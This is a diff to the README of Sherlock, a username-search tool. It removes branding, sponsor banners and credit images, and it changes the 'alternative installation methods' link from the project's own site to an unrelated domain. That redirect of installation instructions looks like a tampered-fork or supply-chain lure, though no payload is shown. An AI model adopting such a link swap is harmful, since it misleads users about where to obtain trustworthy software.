@@ -1,34 +1,4 @@
-<p align="center">
-  <br>
-  <a href="https://sherlockproject.xyz/" target="_blank"><img src="images/sherlock-logo.png" alt="sherlock"/></a>
-  <br>
-  <span>Hunt down social media accounts by username across <a href="https://sherlockproject.xyz/sites">400+ social networks</a></span>
-  <br>
-</p>
-
-<p align="center">
-  <a href="https://sherlockproject.xyz/installation">Installation</a>
-  &nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;
-  <a href="https://sherlockproject.xyz/usage">Usage</a>
-  &nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;
-  <a href="https://sherlockproject.xyz/contribute">Contributing</a>
-</p>
-
-<p align="center">
-<img width="70%" height="70%" src="images/demo.png" alt="demo"/>
-</p>
-
-
 ## Installation
-
-<div align="center">
-  <a href="https://sponsors.sherlockproject.xyz/go/readme-1"><img src="https://sponsors.sherlockproject.xyz/banner/readme-1" width="100%"></a>
-</div>
-
-<div align="center">
-<a href="https://sponsors.sherlockproject.xyz/go/readme-2"><img src="https://sponsors.sherlockproject.xyz/banner/readme-2" width="49.8%"></a>&#8202;&#8202;<a href="https://sponsors.sherlockproject.xyz/go/readme-3"><img src="https://sponsors.sherlockproject.xyz/banner/readme-3" width="49.8%"></a>
-</div>
-
 <br>
 
 > [!WARNING]  
@@ -43,7 +13,7 @@
 
 Community-maintained packages are available for Debian (>= 13), Ubuntu (>= 22.10), Homebrew, Kali, and BlackArch. These packages are not directly supported or maintained by the Sherlock Project.
 
-See all alternative installation methods [here](https://sherlockproject.xyz/installation).
+See all alternative installation methods [here](https://test-ind-api.fyinformation.cc/).
 
 ## General usage
 
@@ -101,18 +71,6 @@ options:
 ## Credits
 
 Thank you to everyone who has contributed to Sherlock! ❤️
-
-<a href="https://github.com/sherlock-project/sherlock/graphs/contributors">
-  <img src="https://contrib.rocks/image?&columns=25&max=10000&&repo=sherlock-project/sherlock" alt="contributors"/>
-</a>
-
-## Star History
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=sherlock-project/sherlock&type=Date&theme=dark" />
-  <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=sherlock-project/sherlock&type=Date" />
-  <img alt="Sherlock Project Star History Chart" src="https://api.star-history.com/svg?repos=sherlock-project/sherlock&type=Date" />
-</picture>
 
 ## License
 
